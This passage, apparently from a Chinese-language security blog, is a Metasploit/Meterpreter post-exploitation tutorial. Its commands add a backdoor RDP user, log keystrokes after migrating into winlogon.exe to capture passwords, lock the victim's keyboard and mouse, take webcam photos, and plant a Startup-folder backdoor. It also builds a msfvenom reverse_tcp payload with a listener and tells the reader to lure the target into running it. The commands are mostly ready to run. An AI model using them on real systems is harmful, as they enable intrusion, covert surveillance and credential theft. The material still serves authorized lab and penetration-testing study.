apl">enable_rdp脚本:<br>run post/windows/manage/enable_rdp USERNAME=cherry PASSWORD=123456    #添加用户<br>run post/windows/manage/enable_rdp                                    #开启远程桌面<br>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662            #将3389端口转发到6662<br></code></pre></td></tr></table></figure><h3 id="7-13-启用远程桌面："><a href="#7-13-启用远程桌面：" class="headerlink" title="7.13 启用远程桌面："></a><strong>7.13 启用远程桌面：</strong></h3><ul><li><p>当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。</p></li><li><p>首先，我们需要确保目标Windows设备开启了远程桌面功能（需要开启多个服务），我们输入：<code>run post/windows/manage/enable_rdp</code>命令可以开启远程桌面。</p></li><li><p>在开启远程桌面会话之前，我们还需要使用<code>idletime命令</code>检查远程用户的空闲时长：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">idletime<br></code></pre></td></tr></table></figure><h3 id="7-14-键盘记录"><a href="#7-14-键盘记录" class="headerlink" title="7.14 键盘记录:"></a><strong>7.14 键盘记录:</strong></h3><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">keyscan_start： #开启键盘记录功能，开关键盘记录功能后目标输入的内容我们就通过keyscan_dump命令在Meterpreter里面进行查看；<br>keyscan_dump：  #显示捕捉到的键盘记录信息<br>keyscan_stop：  #停止键盘记录功能<br></code></pre></td></tr></table></figure><p>注：在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录。</p><h3 id="7-15-进程迁移："><a href="#7-15-进程迁移：" class="headerlink" title="7.15 进程迁移："></a><strong>7.15 进程迁移：</strong></h3><p>Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让Meterpreter与类似explorer.exe这样的进程进行绑定，并以此来实现持久化。</p><p>在下面的例子中，我们会将<code>Meterpreter</code>跟 <code>winlogon.exe</code>绑定，并在登录进程中捕获键盘记录，以获得用户的密码。</p><p>首先，我们需要使用：<code>ps</code> 命令查看目标设备中运行的进程：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408170914111.png" alt="image-20250408170914111"></p><p>我们可以使用：<code>getpid</code> 查看我们当前的进程id：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">getid<br></code></pre></td></tr></table></figure><p>使用：<code>migrate</code>+<code>目标进程ID</code>命令来绑定目标进程id，可以看到通过进程迁移后，当前的<code>Meterpreter</code>的<code>pid</code>已经和 <code>winlogon.exe</code>一样了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250408171334516.png" alt="image-20250408171334516"></p><p>这里绑定目标pid的时候，经常会断了shell。进程迁移后会自动关闭原来Meterpreter进程，没有关闭可使用 <code>kill pid</code> 命令关闭进程。</p><p>或者使用自动迁移进程（<code>run post/windows/manage/migrate</code>）命 令，系统会自动寻找合适的进程然后迁移。</p><h3 id="7-16-禁止目标主机使用键盘鼠标"><a href="#7-16-禁止目标主机使用键盘鼠标" class="headerlink" title="7.16 禁止目标主机使用键盘鼠标"></a><strong>7.16 禁止目标主机使用键盘鼠标</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">uictl  disable(enable) keyboard  #禁止(允许)目标使用键盘<br>uictl  disable(enable) mouse     #禁止(允许)目标使用鼠标<br></code></pre></td></tr></table></figure><h3 id="7-17-用目标主机摄像头拍照："><a href="#7-17-用目标主机摄像头拍照：" class="headerlink" title="7.17 用目标主机摄像头拍照："></a><strong>7.17 用目标主机摄像头拍照：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">webcam_list    #获取目标系统的摄像头列表<br>webcam_snap    #从指定的摄像头，拍摄照片<br>webcam_stream  #从指定的摄像头，开启视频<br></code></pre></td></tr></table></figure><h3 id="7-18-常用扩展库介绍"><a href="#7-18-常用扩展库介绍" class="headerlink" title="7.18 常用扩展库介绍"></a><strong>7.18 常用扩展库介绍</strong></h3><p>meterpreter中不仅有基本命令还有很多扩展库，下面就介绍一下常用的扩展库的查看方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">load/use     #加载模块<br>load -l      #列出所有可用的扩展<br>load -help   #帮助；说明<br>run          #执行一个已有的模块<br></code></pre></td></tr></table></figure><p>注：这里输入run后，双击Tab键列出所有的已有的脚本；</p><h3 id="7-19-生成持续性后门（重点）："><a href="#7-19-生成持续性后门（重点）：" class="headerlink" title="7.19 生成持续性后门（重点）："></a><strong>7.19 生成持续性后门（重点）：</strong></h3><p>因为<code>meterpreter</code> 是基于<code>内存DLL</code>建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。</p><p>建立持续性后门有两种方法，一种是通过<code>启动项启动(persistence)</code>，一种是通过<code>服务启动(metsvc)</code></p><h3 id="7-19-1-启动项启动："><a href="#7-19-1-启动项启动：" class="headerlink" title="7.19.1 启动项启动："></a><strong>7.19.1 启动项启动：</strong></h3><p>启动项启动的话，我们先生成一个后门木马。</p><p>需要去学习怎么生成后门木马 todo</p><p>然后放到<code>windows的启动目录</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure><p>这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。</p><h1 id="msf制作反弹shell"><a href="#msf制作反弹shell" class="headerlink" title="msf制作反弹shell"></a>msf制作反弹shell</h1><h2 id="1-制作反弹shell-exe文件"><a href="#1-制作反弹shell-exe文件" class="headerlink" title="1.制作反弹shell-exe文件"></a>1.制作反弹shell-exe文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kaili的ip地址 LPORT=5577 -f exe -o /root/test.exe<br><br>LHOST    kaili的ip地址<br>LPORT    为反弹端口<br>test.exe 为生成文件<br></code></pre></td></tr></table></figure><p>木马生成成功：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250411110707974.png" alt="image-20250411110707974"></p><p>然后把木马传输到主机</p><h2 id="2-控制端启动msfconsole，获取监听"><a href="#2-控制端启动msfconsole，获取监听" class="headerlink" title="2.控制端启动msfconsole，获取监听"></a>2.控制端启动msfconsole，获取监听</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>msf5 &gt; use exploit/multi/handler<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST 0.0.0.0<br>msf5 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT 5577<br>msf5 exploit(multi/handler) &gt; run<br><br>一句话：<br>handler -p windows/meterpreter/reverse_tcp -H kaili的ip地址 -P 5577<br></code></pre></td></tr></table></figure><p>这时候只需要诱惑点击我们的test.exe文件。我们就可以进入到meterpreter界面了。</p><h2 id="3-反弹成功"><a href="#3-反弹成功" class="headerlink" title="3.反弹成功"></a>3.反弹成功</h2><p>因为我win7拖拽文件有问题。这里我使用Win10做靶机。</p><p>成功获取到对话：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/image-20250411111842192.png" alt="image-20250411111842192"></p><p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell         #获取目标主机的cmd_shell权限<br>chcp 65001    #这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透相关</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
